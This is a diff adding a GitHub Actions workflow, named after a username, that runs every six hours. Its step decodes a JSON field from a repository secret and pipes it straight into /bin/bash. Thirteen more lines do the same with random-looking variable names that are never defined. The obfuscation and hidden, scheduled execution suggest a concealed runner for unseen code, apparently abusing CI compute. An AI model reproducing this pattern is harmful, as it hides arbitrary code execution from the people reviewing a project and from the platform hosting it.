@@ -1,0 +1,30 @@
+name: zhangwuhui4765
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhangwuhui4765
+        env:
+          ahsue912: ${{ secrets.ahsue912 }}
+        run: |
+          echo $ahsue912 | jq -r .ovq93 | /bin/bash
+          echo $crwkm5174 | jq -r .vvt15961 | /bin/bash
+          echo $owks042 | jq -r .d96 | /bin/bash
+          echo $bjmfa01 | jq -r .gf48 | /bin/bash
+          echo $o8276 | jq -r .am702 | /bin/bash
+          echo $y13 | jq -r .rbs137 | /bin/bash
+          echo $qzwl6 | jq -r .ehel7 | /bin/bash
+          echo $i5803 | jq -r .t6 | /bin/bash
+          echo $n92667 | jq -r .wbo808 | /bin/bash
+          echo $ylc8930 | jq -r .gik164 | /bin/bash
+          echo $ljt026 | jq -r .g412 | /bin/bash
+          echo $eo06998 | jq -r .iudb7 | /bin/bash
+          echo $gpcyv422 | jq -r .hj13 | /bin/bash
+          echo $vwo66034 | jq -r .ppelz738 | /bin/bash
+
